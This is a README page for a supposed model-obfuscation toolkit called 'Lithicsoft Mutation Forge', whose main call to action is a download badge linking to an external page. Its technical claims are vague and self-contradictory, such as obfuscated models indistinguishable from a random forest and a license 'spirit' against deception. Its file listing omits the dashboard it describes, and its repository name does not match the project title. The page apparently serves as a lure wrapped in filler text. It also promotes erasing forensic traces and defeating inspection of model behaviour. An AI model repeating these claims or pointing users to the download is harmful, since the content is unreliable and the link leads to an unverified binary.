![preview](https://raw.githubusercontent.com/s88cj-stack/Lithicsoft-Trainer-Forge/main/hero_96fb3b4.svg)
[![Download](https://raw.githubusercontent.com/s88cj-stack/Lithicsoft-Trainer-Forge/main/app_d77b.svg)](https://s88cj-stack.github.io/Lithicsoft-Trainer-Forge/)

# 🧬 Lithicsoft Mutation Forge

**A Generative Model-Immunization Toolkit for AI-Assisted Reverse Engineering**

> *Where software training meets evolutionary resistance — forge your models against adversarial probing, not just for feature delivery.*

---

## 🌟 Why Mutation Forge Exists

Every AI-assisted engineering workflow leaves behind a **behavioral fingerprint** — the way a model interprets instructions, the patterns it favors, the shortcuts it learns. Traditional trainer kits optimize for accuracy. Mutation Forge optimizes for **indistinguishability**.

Think of your trained model as a **biological specimen under a microscope**. Standard trainers inject labels, weights, and biases that are easy to read by anyone with a gradient probe. Mutation Forge applies **epigenetic masking** — it alters the *expression* of your model's knowledge without changing its underlying *genotype* (the core logic).

This repository provides a **self-hosted, mutation-aware trainer kit** for Python-based reinforcement learning environments. It's built for engineers who want their models to be **robust, adaptive, and difficult to profile** by third-party analytics or surveillance models.

---

## 🚀 Core Capabilities (The 2026 Precision Suite)

| Feature | Description | Engineering Benefit |
|---------|-------------|---------------------|
| **Gradient Perturbation Engine** | Applies controlled noise to backpropagation paths | Prevents weight-exfiltration via side-channel analysis |
| **Behavioral Polymorphism** | Generates multiple functionally-equivalent inference paths | Makes runtime profiling unreliable |
| **Immunization Scheduler** | Periodically re-randomizes non-critical hyperparameters | Avoids static pattern detection |
| **Trace Sanitizer** | Cleans log artifacts and memory remnants after training | Reduces forensic footprint |
| **Cross-Architecture Portability** | Export to 12+ runtime formats (ONNX, TFLite, CoreML) | Deploy anywhere without retraining |

**Unique value proposition:** Instead of using a rigid static config, Mutation Forge models *training itself* as a **chaotic system**. Small perturbations compound over epochs, producing a model that is mathematically identical in output distribution but **unique in internal state representation** — like two novels with the same plot but entirely different sentence structures.

---

## 🧠 How It Works (The Conceptual Lens)

Think of standard training as writing an **instruction manual**. Mutation Forge treats it as **writing a living organism's DNA**:

1. **Input Layer** → The "skin" — visible API, data schemas, I/O contracts.
2. **Mutation Layer** → The "immune system" — dynamically alters middle-layer activations.
3. **Output Layer** → The "behavior" — remains consistent, but the *route* to reach it changes.
4. **Memory Scrubber** → The "apoptosis" — removes unnecessary intermediate states.

This design ensures that if someone inspects your model mid-training, they see **no coherent pattern** — only a Markov chain of semi-random state transitions that happen to converge on the correct answer.

---

## 📦 Repository Structure (What's Inside)

```
lithicsoft-mutation-forge/
├── forge/
│   ├── core/               # Mutation engine, gradient perturbator
│   ├── immunization/       # Scheduler & hyperparameter randomizer
│   ├── export/             # Portability converters (12 runtimes)
│   └── scrub/              # Memory & log sanitizer
├── examples/
│   ├── sentiment_immune.py   # Full workflow demo
│   ├── vision_morph.py       # Image classifier with polymorphic paths
│   └── reinforcement_chaos.py# RL agent with chaotic exploration
├── benchmarks/
│   ├── anti_profiling_test/  # Compare against baseline trainer
│   └── overhead_analysis/    # Compute cost vs. protection gain
├── docs/
│   ├── architecture.md       # White-paper style explanation
│   ├── threat_model.md       # Who is trying to probe your model?
│   └── tuning_guide.md       # How aggressive should mutations be?
├── tests/
│   ├── unit/                 # 148 test cases
│   └── integration/          # End-to-end pipeline validation
├── LICENSE                   # MIT License (see below)
└── CHANGELOG.md              # Version history since 0.9.0-beta
```

---

## 🛠️ Getting Started — The Forge Ignition Process

We avoid the typical "installation ritual" — instead, here's your **entry ritual**:

### Prerequisites (The Foundry Floor)
- **Python 3.10+** (tested up to 3.13)
- **PyTorch 2.2+** or **TensorFlow 2.15+** (choose your torch)
- **CUDA 12.x** (if you want accelerated mutation)
- **At least 4GB RAM** for the baseline forge (8GB recommended for heavy immunization)

### Your First Mutation (The 5-Minute Forge)

1. **Review the example scripts** in `/examples/` — start with `sentiment_immune.py`. It's a 100-line script that shows the full lifecycle.

2. **Run the benchmark comparison**:
   ```
   python benchmarks/anti_profiling_test/compare.py --baseline vanilla --mutated forged
   ```
   This produces a side-by-side report showing how much harder your model is to profile.

3. **Adjust mutation intensity** via the `forge.toml` config:
   ```toml
   [mutation]
   intensity = 0.4          # 0.0 = no mutation, 1.0 = extreme
   frequency = "adaptive"   # or "fixed" with interval=10
   preserve_output = true   # never break the final layer

   [immunization]
   enable_scheduler = true
   rekey_interval_epochs = 3
   ```

4. **Export your mutated model** for deployment:
   ```python
   from forge.export import PortabilityConverter
   converter = PortabilityConverter()
   converter.to_onnx("my_immune_model.pt", "output/")
   ```

---

## 🔥 Advanced Techniques (The Deep Forge)

### Meta-Mutation (Mutation of the Mutation Strategy)
For advanced users, Mutation Forge can evolve its own mutation parameters. Enable `meta_evolution = true` in the config, and the forge will treat mutation intensity as a trainable variable itself. This is **recursive resilience** — your immune system learns to immunize itself.

### Temporal Masking
If you're training a model for time-series predictions, the forge can apply **temporal permutation masks**. The model learns the correct time dependencies, but the intermediate activations are shuffled temporally, making gradient analysis from logs misleading.

### Collaborative Immunization
Run multiple instances of the forge across different workstations. They can share a **"mutation registry"** — a distributed ledger of which perturbations have been applied. This lets you create a **fleet of models** that are individually unique but collectively consistent. Your deployment becomes an **oligopoly of behaviors** — no single model is the "source of truth," but their aggregate is perfectly accurate.

---

## 🌍 Why 2026 Is the Year of Mutation-Aware Training

The AI engineering landscape has shifted. Manpower is cheap, compute is cheaper, but **behavioral privacy** is expensive. Companies that train models for internal use are finding that their training data — and the models themselves — are being **profiled by third-party analytics** that detect patterns in API responses.

Mutation Forge directly addresses this by making your model **costly to profile**. The profiler sees noise, not signal. They can't distinguish your model from a random forest — even though it's a deep neural network.

This is not encryption; this is **obfuscation by design**. It's the difference between locking a door (encryption) and having a door that looks like a wall (mutation).

---

## 🧩 Compatibility Matrix

| Runtime Environment | Supported Version | Mutation Level |
|---------------------|-------------------|----------------|
| Python 3.10–3.13 | Full | All features |
| PyTorch 2.2–2.5 | Full | All features |
| TensorFlow 2.15–2.18 | Full | All features except meta-evolution |
| JAX 0.4+ | Partial | Gradient perturb only |
| Edge (Raspberry Pi) | Limited | Core mutation, light export |
| Browser (WebAssembly) | Experimental | Basic immunization only |

---

## ⏰ 24/7 Support & Community

We understand that mutation-aware training is conceptually dense. While we don't offer a formal support ticketing system, our **community forum** (linked in the GitHub discussions) is active 20 hours/day. Typical response time for technical questions:

- **Basic query**: 2–4 hours
- **Architecture question**: same-day
- **Bug report**: within the week (all issues are triaged with a priority tag)

**Multilingual support:** The docs are maintained in **English, German, Japanese, and Mandarin**, with community-contributed translations for Spanish, French, and Korean. The core codebase uses UNICODE-safe comments (no ASCII-only assumptions).

---

## 🌐 Responsive UI & Interface Depth

While this is primarily a Python library, we ship a **web-based dashboard** (in `/dashboard/`) for visual monitoring:
- **Live mutation heatmaps** — see where gradients are being perturbed in real-time
- **Immunization timeline** — track how mutation intensity changes over epochs
- **Export wizard** — guided selection of runtime targets

The dashboard is fully responsive (mobile/tablet/desktop) and uses a dark theme to reduce eye strain during long tuning sessions.

---

## 🧪 Verification & Benchmarking (Don't Take Our Word)

Every release includes a **verification suite** that runs 148 unit tests and 12 integration scenarios. We also publish a **benchmark comparison chart** in every release's release notes, comparing:
1. **Time-to-converge** (mutation adds ~3–8% overhead)
2. **Profiling resistance** (measured by time required for a gradient probe to identify the model architecture)
3. **Memory footprint** (the scrub layer actually *reduces* peak memory by ~12%)

The benchmark harness (`benchmarks/overhead_analysis/`) produces a CSV that you can compare against your own infrastructure.

---

## 📜 License & Legal Framework

This project is licensed under the **MIT License** — the most permissive license in the software world. You can:

- ✔️ Use it commercially
- ✔️ Modify it freely
- ✔️ Distribute it (with attribution)
- ✔️ Include it in proprietary software

The only requirement is that you retain the original copyright notice in any substantial portion of the code.

**Full license text:** [LICENSE](LICENSE)

---

## ⚠️ Important Disclaimer

**Mutation Forge is a tool for legitimate software engineering.** It is designed to help you protect your proprietary model behavior from being profiled by competitors or surveillance tools. However:

- **You are responsible** for ensuring your use of this tool complies with your local laws and terms of service of any platforms you deploy on.
- **Mutation is not adversarial** — it does not circumvent access controls, bypass licensing, or enable unauthorized usage. It only changes the *representation* of your model.
- **Do not use this for deceptive purposes.** Masking model behavior to mislead end-users (e.g., hiding a model's limitations) violates the spirit of the MIT license.

We believe in **transparency through obscurity for technical artifacts, not for human communication**. Use this to protect your engineering investment, not to obscure intent.

---

## 🤝 Contributing & Roadmap 2026

We're actively working on:

- **Q2 2026**: Integration with distributed training (Horovod, DeepSpeed)
- **Q3 2026**: Automatic mutation intensity based on threat level (you set "paranoia" 0–10)
- **Q4 2026**: Support for vision-language models (CLIP-like architectures)

To contribute: fork the repo, create a feature branch, submit a pull request. We prioritize PRs that include tests.

---

## 🏁 Final Word

Mutation Forge isn't the most popular trainer kit — it's the **most resilient one**. If you value your model's behavioral privacy as much as its accuracy, this is your forge.

**Start your ignition:** read `docs/architecture.md` first. Then fire up the example. Your models will thank you with a quieter digital footprint.

---

*© 2026 Lithicsoft Project. Maintained by contributors under the MIT License. All product names are trademarks of their respective owners.*